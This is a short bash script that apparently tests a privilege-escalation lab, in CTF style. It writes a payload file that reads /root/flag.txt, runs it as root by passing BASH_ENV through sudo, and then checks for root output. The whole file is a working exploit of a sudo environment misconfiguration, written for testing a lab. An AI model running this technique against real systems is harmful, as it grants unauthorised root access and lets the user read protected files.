#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat > /home/lowpriv/bash_env/pwn.sh <<'\''EOF'\''
cat /root/flag.txt
EOF
chmod +x /home/lowpriv/bash_env/pwn.sh
sudo -n BASH_ENV=/home/lowpriv/bash_env/pwn.sh /bin/bash -c true
')"
assert_root_output "${out}"
